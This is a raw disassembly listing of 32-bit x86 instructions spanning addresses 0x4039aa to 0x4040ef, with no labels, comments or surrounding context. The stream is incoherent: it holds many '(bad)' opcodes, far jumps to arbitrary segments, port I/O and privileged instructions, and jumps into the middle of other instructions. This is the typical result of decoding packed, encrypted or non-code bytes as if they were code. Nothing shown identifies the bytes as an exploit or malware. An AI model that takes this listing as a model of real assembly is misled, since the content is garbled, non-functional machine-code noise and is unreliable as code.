  4039aa:	ds ins BYTE PTR es:[edi],dx
  4039ac:	arpl   WORD PTR [edi+0x2],bx
  4039af:	ins    BYTE PTR es:[edi],dx
  4039b0:	jmp    0xd945:0xbb9fbdc9
  4039b7:	add    BYTE PTR [esi],bh
  4039b9:	mov    ebx,0xb69ab104
  4039be:	jmp    0x74dd:0x4324cfbf
  4039c5:	les    ebp,FWORD PTR [ebp+0x4c3ef74a]
  4039cb:	es and eax,0x79bf4905
  4039d1:	pop    ebp
  4039d2:	cmp    al,BYTE PTR [ecx+0x4116fdfc]
  4039d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039d9:	or     bl,al
  4039db:	mov    ecx,0xfc7add05
  4039e0:	loope  0x4039d6
  4039e2:	in     eax,0xdb
  4039e4:	xlat   BYTE PTR ds:[ebx]
  4039e5:	mov    ah,0xf9
  4039e7:	idiv   dl
  4039e9:	jecxz  0x403a3a
  4039eb:	outs   dx,DWORD PTR ds:[esi]
  4039ec:	pop    ebp
  4039ed:	xchg   edi,eax
  4039ee:	add    bh,BYTE PTR [esi]
  4039f0:	imul   ebx,DWORD PTR [ecx+0x72],0xd668a1b
  4039f7:	hlt    
  4039f8:	test   eax,0xe3b5803a
  4039fd:	dec    ebx
  4039fe:	(bad)  
  4039ff:	pop    esi
  403a00:	jb     0x403991
  403a02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a03:	ja     0x403994
  403a05:	and    eax,0xe7346d27
  403a0a:	in     eax,0x5e
  403a0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a0d:	or     BYTE PTR [ecx],bh
  403a0f:	jg     0x403a40
  403a11:	dec    edi
  403a12:	imul   edx,edi,0x22a37d56
  403a18:	cmp    ch,BYTE PTR [edx+0x79d89dcc]
  403a1e:	and    eax,0x7b6ed8af
  403a23:	sbb    BYTE PTR [ecx+edi*4],dh
  403a26:	pop    ds
  403a27:	mov    eax,ds:0x18be77fa
  403a2c:	nop
  403a2d:	icebp  
  403a2e:	mov    ebp,0xec192f86
  403a33:	mov    BYTE PTR [ecx],dl
  403a35:	lds    esp,FWORD PTR [edx]
  403a37:	adc    DWORD PTR [ebx+ecx*4+0x5e],ecx
  403a3b:	xchg   ebx,eax
  403a3c:	sbb    bh,BYTE PTR [ebx]
  403a3e:	es jp  0x403a3f
  403a41:	xchg   ecx,eax
  403a42:	mov    ebx,0xfdc558f4
  403a47:	ins    BYTE PTR es:[edi],dx
  403a48:	xor    edi,edi
  403a4a:	mov    cl,0x4e
  403a4c:	lods   eax,DWORD PTR ds:[esi]
  403a4d:	dec    ebp
  403a4e:	sbb    esi,eax
  403a50:	xchg   ecx,eax
  403a51:	xor    BYTE PTR [esi],bh
  403a53:	pop    ecx
  403a54:	xchg   edi,eax
  403a55:	test   BYTE PTR [ebx+0x1e086f47],cl
  403a5b:	push   edx
  403a5c:	push   ebp
  403a5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a5e:	cmc    
  403a5f:	scas   eax,DWORD PTR es:[edi]
  403a60:	lock push edx
  403a62:	cmc    
  403a63:	fwait
  403a64:	pop    esp
  403a65:	cmp    DWORD PTR [esp+eax*1+0x17],eax
  403a69:	loope  0x403aa9
  403a6b:	push   edi
  403a6c:	(bad)  [esi+0x6a]
  403a6f:	sub    ebp,ecx
  403a71:	cmp    eax,0x61edc915
  403a76:	scas   al,BYTE PTR es:[edi]
  403a77:	arpl   WORD PTR [ecx-0x41],si
  403a7a:	jbe    0x403ad6
  403a7c:	(bad)  
  403a7d:	int    0xfc
  403a7f:	adc    BYTE PTR [ecx+0x876b2d8],bh
  403a85:	sub    edx,DWORD PTR [edx]
  403a87:	(bad)  
  403a88:	stos   BYTE PTR es:[edi],al
  403a89:	sti    
  403a8a:	or     BYTE PTR [ebp-0x7e267ca5],dh
  403a90:	(bad)
  403a95:	push   eax
  403a96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a97:	adc    edx,DWORD PTR [ecx-0x1b]
  403a9a:	xchg   edi,eax
  403a9b:	and    dh,al
  403a9d:	and    BYTE PTR [edx],bl
  403a9f:	cwde   
  403aa0:	popa   
  403aa1:	push   ebx
  403aa2:	int    0xc1
  403aa4:	into   
  403aa5:	in     eax,dx
  403aa6:	mov    ?,WORD PTR [eax-0x6f]
  403aa9:	addr16 mov ds:0x4cb9,eax
  403aad:	mov    bh,0xf4
  403aaf:	xchg   ebx,eax
  403ab1:	and    al,0x9b
  403ab3:	shr    bh,0xe4
  403ab6:	ror    bh,1
  403ab8:	cmc    
  403ab9:	sbb    al,0x44
  403abb:	push   esp
  403abc:	dec    edx
  403abd:	mov    dl,0x83
  403abf:	or     al,0x95
  403ac1:	push   edi
  403ac2:	ds dec esi
  403ac4:	test   DWORD PTR ds:0x1478126b,edx
  403aca:	adc    al,0xb1
  403acc:	mov    ebx,0x5404ffdf
  403ad1:	ins    DWORD PTR es:[edi],dx
  403ad2:	cli    
  403ad3:	out    0x7f,eax
  403ad5:	aas    
  403ad6:	xchg   DWORD PTR [edi],esi
  403ad8:	pop    esi
  403ad9:	mov    ebx,0x6e8addb9
  403ade:	fstp   TBYTE PTR [ebx-0x3c]
  403ae1:	add    BYTE PTR [edi+0x11],dl
  403ae4:	push   esp
  403ae5:	retf   0xb19
  403ae8:	mov    WORD PTR [eax],gs
  403aea:	pop    es
  403aeb:	popa   
  403aec:	xchg   esi,eax
  403aed:	mov    esp,0x6f87bcd
  403af2:	sbb    al,0x24
  403af4:	nop
  403af5:	and    al,0xfa
  403af7:	loope  0x403aed
  403af9:	push   0x93df487d
  403afe:	(bad)  
  403aff:	adc    DWORD PTR [eax+0x3e17ef91],ebp
  403b05:	leave  
  403b06:	sub    DWORD PTR [eax+0x5d],ebp
  403b09:	clc    
  403b0a:	jmp    0x1f8a:0x5d85cc89
  403b11:	xchg   BYTE PTR [eax+eiz*1],dh
  403b14:	mov    dl,0xf
  403b16:	(bad)  
  403b17:	mov    esi,0x912821c5
  403b1c:	icebp  
  403b1d:	scas   eax,DWORD PTR es:[edi]
  403b1e:	push   ss
  403b1f:	cmp    edx,DWORD PTR ds:0xe9f46f08
  403b25:	sub    DWORD PTR [edx+eiz*8],ebp
  403b28:	js     0x403ad4
  403b2a:	sbb    al,BYTE PTR [edx]
  403b2c:	gs and eax,0xade1debd
  403b32:	imul   esp,DWORD PTR [ebx-0x7c7a9121],0x20
  403b39:	test   eax,0xafbf5f9f
  403b3e:	jp     0x403af5
  403b40:	lods   al,BYTE PTR cs:[esi]
  403b42:	push   ss
  403b43:	push   edx
  403b44:	enter  0x41,0x1d
  403b48:	retf   
  403b49:	xor    DWORD PTR [edi],esp
  403b4b:	test   DWORD PTR [edi],edx
  403b4d:	imul   ebp,DWORD PTR [esi+ebp*4+0x1e],0xffffff84
  403b52:	imul   ecx,DWORD PTR [ebx+0x56],0x33
  403b56:	(bad)  
  403b58:	ret    
  403b59:	imul   edi,DWORD PTR [ecx],0x4e33e390
  403b5f:	xlat   BYTE PTR ds:[ebx]
  403b60:	adc    ch,BYTE PTR [edi+0x2b]
  403b63:	pop    eax
  403b64:	imul   edx,DWORD PTR [edi+ecx*8-0x58b99602],0xffffffbb
  403b6c:	inc    DWORD PTR [edi+0x4f286342]
  403b72:	jae    0x403af8
  403b74:	mov    bl,0xfc
  403b76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b77:	stc    
  403b78:	jecxz  0x403bd1
  403b7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b7b:	cld    
  403b7c:	xchg   esi,eax
  403b7d:	jle    0x403bbf
  403b7f:	xor    eax,0x3e03f9db
  403b84:	in     eax,0xa8
  403b86:	push   ds
  403b87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b88:	xchg   esi,eax
  403b89:	mov    dh,0x4e
  403b8b:	(bad)  
  403b8d:	push   esp
  403b8e:	mov    dh,0x52
  403b90:	add    DWORD PTR [edx],0xfffffffb
  403b93:	pop    esp
  403b94:	add    BYTE PTR [esi],ch
  403b96:	jp     0x403b44
  403b98:	out    dx,eax
  403b99:	out    dx,al
  403b9a:	rcl    BYTE PTR [ebp-0x2c],1
  403b9d:	push   eax
  403b9e:	pushf  
  403b9f:	xchg   ebx,eax
  403ba0:	shl    esi,cl
  403ba2:	and    BYTE PTR [ecx],ch
  403ba4:	pop    edx
  403ba5:	push   edi
  403ba6:	mov    cl,0x13
  403ba8:	addr16 pusha 
  403baa:	js     0x403bbf
  403bac:	call   0x83debb9
  403bb1:	ret    0xd783
  403bb4:	ja     0x403b49
  403bb6:	clc    
  403bb7:	jp     0x403bab
  403bb9:	and    edi,edi
  403bbb:	cmc    
  403bbc:	cmp    dl,ah
  403bbe:	sub    eax,0x6b337bd1
  403bc3:	inc    eax
  403bc4:	sti    
  403bc5:	loop   0x403c13
  403bc7:	sub    eax,0x6c987b5
  403bcc:	popa   
  403bcd:	outs   dx,BYTE PTR ds:[esi]
  403bce:	mov    ds:0x86fb9243,al
  403bd3:	fwait
  403bd4:	add    ah,bl
  403bd6:	icebp  
  403bd7:	xor    DWORD PTR [ebx+edi*2],ecx
  403bda:	enter  0x9334,0xae
  403bde:	lock add dl,ch
  403be1:	mov    bl,0xac
  403be3:	mov    al,ds:0x38a9c5a2
  403be8:	fist   DWORD PTR [ebp+ebx*4+0x5a]
  403bec:	fnstenv [ebx+0x4e]
  403bef:	inc    ebp
  403bf0:	sub    DWORD PTR [ecx+0x1e],ebp
  403bf3:	cmp    BYTE PTR [ebp+ecx*2-0x24],0x13
  403bf8:	gs sysexit 
  403bfb:	icebp  
  403bfc:	scas   eax,DWORD PTR es:[edi]
  403bfd:	out    0xb7,al
  403bff:	sbb    eax,DWORD PTR [ecx-0x110263be]
  403c05:	(bad)  
  403c06:	js     0x403bad
  403c08:	dec    eax
  403c09:	pop    edi
  403c0a:	adc    DWORD PTR [edi+0x13],eax
  403c0d:	pop    ebx
  403c0e:	into   
  403c0f:	frstor [edi]
  403c11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c12:	jg     0x403be5
  403c14:	or     ebx,DWORD PTR [edi]
  403c16:	in     al,dx
  403c17:	and    DWORD PTR [ebx],0x15
  403c1a:	sub    al,0x82
  403c1c:	cwde   
  403c1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c1e:	fistp  WORD PTR [edx]
  403c20:	inc    ebp
  403c21:	imul   ebx,DWORD PTR [eax+0x7fa1de8f],0x3e
  403c28:	scas   eax,DWORD PTR es:[edi]
  403c29:	sub    eax,0xccacdf81
  403c2e:	bt     DWORD PTR [edx-0x28037c64],0x63
  403c36:	test   ebp,ebp
  403c38:	mov    ch,0xcc
  403c3a:	adc    eax,0x8e6095e2
  403c3f:	fsubr  QWORD PTR [ecx-0x2011c7ce]
  403c45:	mov    WORD PTR [ebx+ebp*4-0x6d],?
  403c49:	out    dx,eax
  403c4a:	arpl   sp,cx
  403c4c:	in     eax,0x33
  403c4e:	inc    ecx
  403c4f:	ja     0x403bf7
  403c51:	jl     0x403cd0
  403c53:	lods   eax,DWORD PTR ds:[esi]
  403c54:	invd   
  403c56:	rol    bh,1
  403c58:	lods   al,BYTE PTR ds:[esi]
  403c59:	daa    
  403c5a:	jl     0x403c3b
  403c5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c5d:	cmp    edi,esp
  403c5f:	out    dx,eax
  403c60:	stos   BYTE PTR es:[edi],al
  403c61:	sbb    eax,0xfe16ea46
  403c66:	mov    ch,0x4d
  403c68:	mov    edx,0x462d1ebe
  403c6d:	or     ch,BYTE PTR [edi-0x73]
  403c70:	jmp    0x8021:0xd9ad83ed
  403c77:	not    DWORD PTR [esi]
  403c79:	out    0x3c,eax
  403c7b:	xchg   edi,eax
  403c7c:	dec    ebx
  403c7d:	sbb    edx,DWORD PTR [eax-0x9]
  403c80:	ins    DWORD PTR es:[edi],dx
  403c81:	jae    0x403cdc
  403c83:	(bad)  
  403c85:	cmp    bl,BYTE PTR [ebp+0x5d]
  403c88:	lods   eax,DWORD PTR ds:[esi]
  403c89:	gs cwde 
  403c8b:	stos   BYTE PTR es:[edi],al
  403c8c:	test   BYTE PTR [ecx-0x12],0xe0
  403c90:	jg     0x403c24
  403c92:	adc    bh,BYTE PTR [ecx+0x51a9a9e2]
  403c98:	and    BYTE PTR [ebx],0x58
  403c9b:	lods   al,BYTE PTR ds:[esi]
  403c9c:	ret    
  403c9d:	pusha  
  403c9e:	jb     0x403d17
  403ca0:	xchg   DWORD PTR [edi-0x20eea728],esi
  403ca6:	mov    ds:0x79e935d4,al
  403cab:	mov    eax,0x484f0711
  403cb0:	lds    ebx,FWORD PTR [eax]
  403cb2:	inc    edx
  403cb3:	dec    edi
  403cb4:	pop    edi
  403cb5:	std    
  403cb6:	pop    ecx
  403cb7:	push   ebx
  403cb8:	dec    eax
  403cb9:	inc    ebp
  403cba:	inc    esi
  403cbb:	sbb    cl,bh
  403cbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cbe:	je     0x403d29
  403cc0:	test   BYTE PTR [edx-0x7b],dh
  403cc3:	idiv   BYTE PTR ds:0xac3ca21b
  403cc9:	rcl    BYTE PTR [edi-0x41d9f87a],cl
  403ccf:	push   ss
  403cd0:	scas   eax,DWORD PTR es:[edi]
  403cd1:	add    esp,edx
  403cd3:	stc    
  403cd4:	adc    ch,cl
  403cd6:	je     0x403c9d
  403cd8:	std    
  403cd9:	add    ebp,DWORD PTR [edi]
  403cdb:	out    dx,eax
  403cdc:	or     al,0x6d
  403cde:	add    BYTE PTR [edi],ah
  403ce0:	push   cs
  403ce1:	and    ebx,esi
  403ce3:	inc    edx
  403ce4:	sub    esp,0x230b8135
  403cea:	xlat   BYTE PTR ds:[ebx]
  403ceb:	lods   eax,DWORD PTR ds:[esi]
  403cec:	dec    eax
  403ced:	sub    eax,DWORD PTR [edi+0x5f]
  403cf0:	pop    edx
  403cf1:	in     al,dx
  403cf2:	lea    eax,[eax]
  403cf4:	inc    esp
  403cf5:	lahf   
  403cf6:	das    
  403cf7:	cdq    
  403cf8:	(bad)  
  403cf9:	inc    ebx
  403cfa:	sub    al,al
  403cfc:	out    dx,eax
  403cfd:	imul   edx,DWORD PTR [edx-0x2cc64f22],0xffffff99
  403d04:	jnp    0x403cb8
  403d06:	out    dx,al
  403d07:	addr16 xchg edx,eax
  403d09:	mov    esp,gs
  403d0b:	mov    DWORD PTR [edx+0x78ce88a9],ebp
  403d11:	sbb    bl,dl
  403d13:	fisub  DWORD PTR [esi+0x50048bd1]
  403d19:	xchg   ebx,eax
  403d1a:	fwait
  403d1b:	mov    ebp,0xd13ab9bf
  403d20:	int3   
  403d21:	lock ins BYTE PTR es:[edi],dx
  403d23:	out    0x64,eax
  403d25:	dec    ebx
  403d26:	push   edi
  403d27:	gs mov bh,0xb3
  403d2a:	loop   0x403cfe
  403d2c:	xchg   BYTE PTR [edi],bl
  403d2e:	mov    edx,0x9a409312
  403d33:	cmp    DWORD PTR [ebp+0x50d2830c],ebx
  403d39:	pop    eax
  403d3a:	test   DWORD PTR [ebx+edi*2+0x20],0x7f7988da
  403d42:	add    ch,BYTE PTR [ebp+ebx*1-0x1b]
  403d46:	and    al,BYTE PTR [esi-0x1c]
  403d49:	out    dx,al
  403d4a:	out    dx,al
  403d4b:	pop    edi
  403d4c:	sahf   
  403d4d:	retf   
  403d4e:	jno    0x403d0c
  403d50:	adc    BYTE PTR [edx],0x29
  403d53:	leave  
  403d54:	xor    ah,ah
  403d56:	xchg   edi,eax
  403d57:	sbb    DWORD PTR [edi-0xb],esi
  403d5a:	call   0x51e0d0fe
  403d5f:	xor    al,0xe7
  403d61:	outs   dx,DWORD PTR ds:[esi]
  403d62:	or     edx,esi
  403d64:	retf   0xab84
  403d67:	adc    eax,0x6054a684
  403d6c:	dec    ecx
  403d6d:	adc    eax,DWORD PTR [esi-0x52]
  403d70:	jns    0x403cf2
  403d72:	cli    
  403d73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d74:	loop   0x403db8
  403d76:	ss popa 
  403d78:	sbb    bh,dl
  403d7a:	iret   
  403d7b:	mov    ch,0x24
  403d7d:	fistp  WORD PTR [ecx-0x61]
  403d80:	mov    ds:0x23c68b99,al
  403d85:	retf   
  403d86:	xor    DWORD PTR [eax-0x2d8dd2ba],esp
  403d8c:	mov    esi,0x9abd34e5
  403d91:	mov    edi,0x47639e21
  403d96:	or     bl,dl
  403d98:	scas   eax,DWORD PTR es:[edi]
  403d99:	js     0x403dc3
  403d9b:	sbb    al,0xe
  403d9d:	mov    DWORD PTR [esi+edx*4-0x43c3a805],ecx
  403da4:	mov    ebx,0x23f5fa68
  403da9:	neg    al
  403dab:	cmc    
  403dac:	push   ds
  403dad:	rcr    DWORD PTR [edi-0x7a918f55],0x5
  403db4:	int    0x51
  403db6:	dec    edx
  403db7:	jecxz  0x403e1e
  403db9:	pop    es
  403dba:	sub    al,0x88
  403dbc:	neg    cl
  403dbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403dbf:	sahf   
  403dc0:	outs   dx,DWORD PTR ds:[esi]
  403dc1:	stos   BYTE PTR es:[edi],al
  403dc2:	(bad)  
  403dc3:	or     esp,DWORD PTR [edx]
  403dc5:	mov    edi,0xc04d2123
  403dca:	jmp    DWORD PTR [ecx+0x53]
  403dcd:	into   
  403dce:	aas    
  403dcf:	xchg   ecx,eax
  403dd0:	fst    QWORD PTR [esi-0x62e6a465]
  403dd6:	or     ah,BYTE PTR [ebx-0x5f44156c]
  403ddc:	mov    ds:0xd3b2bdc1,al
  403de1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403de2:	add    bh,ch
  403de4:	arpl   WORD PTR [edx-0x3b],bx
  403de7:	mov    edi,0x3b43ccf
  403dec:	inc    esp
  403ded:	adc    DWORD PTR [ecx+0x56],eax
  403df0:	cmp    eax,0xa249bc33
  403df5:	in     al,0x51
  403df7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403df8:	xor    al,0x47
  403dfa:	icebp  
  403dfb:	(bad)  
  403dfc:	loop   0x403e45
  403dfe:	nop
  403dff:	inc    ebx
  403e00:	pop    esp
  403e01:	mov    al,ds:0x35adce2f
  403e06:	add    DWORD PTR [ebp-0x21],0xffffffc5
  403e0a:	iret   
  403e0b:	loope  0x403e42
  403e0d:	ins    DWORD PTR es:[edi],dx
  403e0e:	push   esp
  403e0f:	jl     0x403e25
  403e11:	adc    BYTE PTR [eax-0x2f],0x34
  403e15:	adc    eax,0x50c445c6
  403e1a:	mov    WORD PTR [ecx+0x2c],es
  403e1d:	lahf   
  403e1e:	idiv   BYTE PTR [ebp+0x238730ae]
  403e24:	jp     0x403e3b
  403e26:	pop    eax
  403e27:	fs inc ebx
  403e29:	daa    
  403e2a:	or     al,ch
  403e2c:	mov    al,ds:0x3feae2e2
  403e31:	jo     0x403eb1
  403e33:	mov    dl,0x97
  403e35:	push   0x536492ff
  403e3a:	int3   
  403e3b:	call   0xe8aca336
  403e40:	dec    ecx
  403e41:	aas    
  403e42:	(bad)  
  403e44:	stos   DWORD PTR es:[edi],eax
  403e45:	fisttp DWORD PTR [edi-0x40ea9d7c]
  403e4b:	hlt    
  403e4c:	(bad)  
  403e4d:	out    0x3,al
  403e4f:	ret    0xf10c
  403e52:	shr    DWORD PTR [edi-0x7c7eea93],0xbf
  403e59:	fbstp  TBYTE PTR [edx]
  403e5b:	ret    
  403e5c:	xor    al,BYTE PTR [edi-0x50ba3409]
  403e62:	xchg   edi,eax
  403e63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e64:	lods   eax,DWORD PTR ds:[esi]
  403e65:	xor    al,0x38
  403e67:	push   cs
  403e68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e69:	mov    eax,ds:0x107861d8
  403e6e:	call   0x5d4d:0x4db24fa7
  403e75:	jg     0x403ed5
  403e77:	mov    ecx,0xd8c7b27f
  403e7c:	xchg   BYTE PTR [ecx+0x70],dh
  403e7f:	or     edi,DWORD PTR [eax-0x20]
  403e82:	shl    BYTE PTR [ebx],0x93
  403e85:	push   ds
  403e86:	cmp    eax,0x3556d2f3
  403e8b:	dec    ebx
  403e8c:	in     eax,0x73
  403e8e:	xor    dl,BYTE PTR [ebx+0x1ba17235]
  403e94:	adc    DWORD PTR [edi+0x35],eax
  403e97:	mov    bh,0xe8
  403e99:	mov    al,0xb1
  403e9b:	sub    al,0x64
  403e9d:	push   esi
  403e9e:	jmp    0x1c9e73d4
  403ea3:	fcomp  QWORD PTR [ecx-0x130a123d]
  403ea9:	cli    
  403eaa:	mov    eax,0xeabfb43e
  403eaf:	dec    ecx
  403eb0:	push   edx
  403eb1:	mov    dl,0xb0
  403eb3:	in     eax,dx
  403eb4:	repnz jecxz 0x403eac
  403eb7:	mov    edi,0xfd171224
  403ebc:	mov    BYTE PTR [ebx+0x74],bl
  403ebf:	retf   
  403ec0:	adc    DWORD PTR [esi+edi*2],0x889f1d1d
  403ec7:	nop
  403ec8:	stos   BYTE PTR es:[edi],al
  403ec9:	dec    ebp
  403eca:	in     al,dx
  403ecb:	sub    edx,DWORD PTR [eax+0x21]
  403ece:	xlat   BYTE PTR ds:[ebx]
  403ecf:	push   0xa9e46d13
  403ed4:	and    al,BYTE PTR [ebp+ebx*2-0xf]
  403ed8:	addr16 inc ebp
  403eda:	jecxz  0x403f18
  403edc:	test   DWORD PTR [eax-0x77b7ad78],edx
  403ee2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ee3:	cmp    al,0xfb
  403ee5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ee6:	shl    BYTE PTR [edx-0x69],0x5f
  403eea:	(bad)  
  403eeb:	scas   al,BYTE PTR es:[edi]
  403eec:	push   esi
  403eed:	or     eax,0x1bf830e1
  403ef2:	test   al,0xd6
  403ef4:	ror    BYTE PTR [edx],0x53
  403ef7:	cmp    DWORD PTR [esi],edi
  403ef9:	pop    edi
  403efa:	cmp    dl,dl
  403efc:	(bad)  
  403efd:	imul   edx,DWORD PTR [ebx+esi*1+0x59],0x20
  403f02:	gs dec esi
  403f04:	push   ss
  403f05:	or     BYTE PTR [esi+0xf],bl
  403f08:	dec    ecx
  403f09:	push   0xffffffed
  403f0b:	sar    BYTE PTR [edx],cl
  403f0d:	xchg   esp,eax
  403f0e:	sbb    bl,BYTE PTR [esi]
  403f10:	test   DWORD PTR [edx+0x4c225689],edx
  403f16:	jmp    0x763b58aa
  403f1b:	loope  0x403ec0
  403f1d:	int    0x93
  403f1f:	sti    
  403f20:	push   ebp
  403f21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f22:	fimul  WORD PTR [esi-0x1f7916bb]
  403f28:	adc    eax,0x1deda4d3
  403f2d:	test   BYTE PTR [ebp+0x7b0893c0],bh
  403f33:	test   DWORD PTR [esi+eax*2+0x2790a215],esp
  403f3a:	jmp    0xec72:0xc9ce837b
  403f41:	or     al,BYTE PTR [edi+0x58]
  403f44:	addr16 add bh,al
  403f47:	push   ebp
  403f48:	pop    es
  403f49:	mov    edx,0x12632520
  403f4e:	in     eax,dx
  403f4f:	stos   BYTE PTR es:[edi],al
  403f50:	in     al,0xf6
  403f52:	mov    cl,0x6a
  403f54:	cli    
  403f55:	or     BYTE PTR [ecx+0x6f56d4],al
  403f5b:	ss inc ebx
  403f5d:	sub    ecx,edx
  403f5f:	stos   BYTE PTR es:[edi],al
  403f60:	es dec ebp
  403f62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f63:	ja     0x403f85
  403f65:	mov    ah,BYTE PTR [esi+0x32]
  403f68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f69:	(bad)  
  403f6b:	xlat   BYTE PTR ds:[ebx]
  403f6c:	sub    BYTE PTR [ecx],dh
  403f6e:	jge    0x403fa4
  403f70:	in     al,dx
  403f71:	scas   al,BYTE PTR es:[edi]
  403f72:	retf   
  403f73:	and    al,0xd2
  403f75:	pop    esp
  403f76:	mov    bh,0xd8
  403f78:	inc    esp
  403f79:	(bad)  
  403f7a:	hlt    
  403f7b:	sub    DWORD PTR [ebp-0x10],0x5f
  403f7f:	pop    ebp
  403f80:	jmp    0x8626ed2f
  403f85:	cmp    DWORD PTR [edi+0x65123c88],ecx
  403f8b:	sbb    eax,0x4a018c4a
  403f90:	dec    esp
  403f91:	xor    dl,BYTE PTR [eax]
  403f93:	icebp  
  403f94:	lock mov ds:0x928f9d24,al
  403f9a:	mov    al,0x33
  403f9c:	pop    eax
  403f9d:	int3   
  403f9e:	adc    al,0x95
  403fa0:	fld    DWORD PTR [ecx+0x2c]
  403fa3:	or     dh,al
  403fa5:	ffreep st(6)
  403fa7:	inc    edi
  403fa8:	jno    0x403f4a
  403faa:	add    eax,0xe0a3d669
  403faf:	push   edx
  403fb0:	jae    0x403fdc
  403fb2:	push   esp
  403fb3:	cmp    al,0x23
  403fb5:	xor    edi,DWORD PTR [edi]
  403fb7:	(bad)  
  403fb8:	push   ecx
  403fb9:	xor    DWORD PTR [ecx],edi
  403fbb:	inc    ebp
  403fbc:	sbb    dh,BYTE PTR [edi]
  403fbe:	adc    BYTE PTR [ebp-0x21],0xb5
  403fc2:	adc    DWORD PTR [ebx],esi
  403fc4:	xor    esp,DWORD PTR [esi+0x39]
  403fc7:	mov    edi,0x3e7a2af2
  403fcc:	icebp  
  403fcd:	or     esp,DWORD PTR [ecx+ebx*2]
  403fd0:	dec    edi
  403fd1:	adc    ah,bh
  403fd3:	hlt    
  403fd4:	jo     0x403fb5
  403fd6:	pop    ebp
  403fd7:	repnz mov al,ds:0x37ff45d6
  403fdd:	xor    al,0xe5
  403fdf:	mov    edx,0xc0b0573d
  403fe4:	sti    
  403fe5:	inc    esp
  403fe6:	nop
  403fe7:	jle    0x404000
  403fe9:	jg     0x404064
  403feb:	xchg   ebx,eax
  403fec:	inc    edx
  403fed:	or     bh,BYTE PTR [edi+0x7fba6c8]
  403ff3:	out    0xc7,al
  403ff5:	pop    edi
  403ff6:	lock shl BYTE PTR [esi],cl
  403ff9:	push   edx
  403ffa:	and    bl,al
  403ffc:	dec    esi
  403ffd:	add    eax,0x3be9789
  404002:	std    
  404003:	das    
  404004:	fwait
  404005:	dec    eax
  404006:	clc    
  404007:	sbb    eax,0xc4923015
  40400c:	or     ebp,DWORD PTR [ecx+0x5b]
  40400f:	mov    ch,0x8c
  404011:	mov    eax,0x64ee5900
  404016:	ss jns 0x403fab
  404019:	mov    edi,0x3d101dae
  40401e:	and    bl,0xea
  404021:	shl    BYTE PTR [ebp+0x4d],1
  404024:	mov    bh,0x4c
  404026:	outs   dx,DWORD PTR ds:[esi]
  404027:	or     eax,eax
  404029:	adc    dh,dh
  40402b:	mov    ah,0xe4
  40402d:	pop    ecx
  40402e:	pusha  
  40402f:	adc    ch,BYTE PTR [esi-0x764457f1]
  404035:	or     DWORD PTR [eax+0x73],esi
  404038:	in     eax,dx
  404039:	fcomp  DWORD PTR [edi+ebx*1+0x57]
  40403d:	inc    esi
  40403e:	mov    edi,0x4d794992
  404043:	adc    DWORD PTR [edx],edi
  404045:	pop    eax
  404046:	mov    cl,0x98
  404048:	clc    
  404049:	mov    dh,0x61
  40404b:	fnstenv [esi+edi*1]
  40404e:	shl    DWORD PTR [ecx-0x59b96ce4],cl
  404054:	add    DWORD PTR [edi+eiz*8-0x573a842a],ebp
  40405b:	fwait
  40405c:	cmc    
  40405d:	lea    eax,[esi]
  40405f:	ins    DWORD PTR es:[edi],dx
  404060:	pop    ds
  404061:	push   esp
  404062:	int    0x99
  404064:	push   esi
  404065:	fnstcw WORD PTR [edx]
  404067:	icebp  
  404068:	or     BYTE PTR [edx],dl
  40406a:	and    DWORD PTR [esi+ebp*2+0x3765a23c],esp
  404071:	test   eax,0xa8049ef3
  404076:	push   0xaa164ae8
  40407b:	mov    esp,0x172dc6
  404080:	out    dx,al
  404081:	adc    eax,0xbc8e5663
  404086:	dec    eax
  404087:	in     eax,dx
  404088:	std    
  404089:	or     edi,DWORD PTR [eax]
  40408b:	rol    DWORD PTR [edx-0x5c],cl
  40408e:	mov    cs,WORD PTR [ebx-0x64]
  404091:	ds (bad) 
  404093:	fldenv [edi-0x70f530c2]
  404099:	fsub   QWORD PTR [esi+0x75f76b56]
  40409f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040a0:	inc    edi
  4040a1:	pop    esi
  4040a2:	dec    ebp
  4040a3:	jmp    0x4040a5
  4040a5:	pop    edi
  4040a6:	dec    edx
  4040a7:	adc    eax,0x63fbe221
  4040ac:	(bad)  
  4040ad:	cld    
  4040ae:	scas   al,BYTE PTR es:[edi]
  4040af:	cli    
  4040b0:	aam    0x10
  4040b2:	retf   0xfbf
  4040b5:	scas   eax,DWORD PTR es:[edi]
  4040b6:	into   
  4040b7:	pop    esp
  4040b8:	mov    eax,0xcb867e2f
  4040bd:	mov    bl,0x5f
  4040bf:	sub    ebp,DWORD PTR [ecx+0x33]
  4040c2:	pop    ebx
  4040c3:	add    al,0xe0
  4040c5:	mov    ebp,0x377f2167
  4040ca:	test   BYTE PTR [ecx+0x3a635ca],ch
  4040d0:	add    eax,0x8a57eb34
  4040d5:	sub    edi,DWORD PTR ds:0x174a2fdd
  4040db:	addr16 mov eax,0x9360be40
  4040e1:	(bad)  
  4040e2:	fwait
  4040e3:	or     eax,0x13a1a10f
  4040e8:	xchg   esi,eax
  4040e9:	ret    0xb741
  4040ec:	shr    BYTE PTR [ecx],0x5d
  4040ef:	sahf   
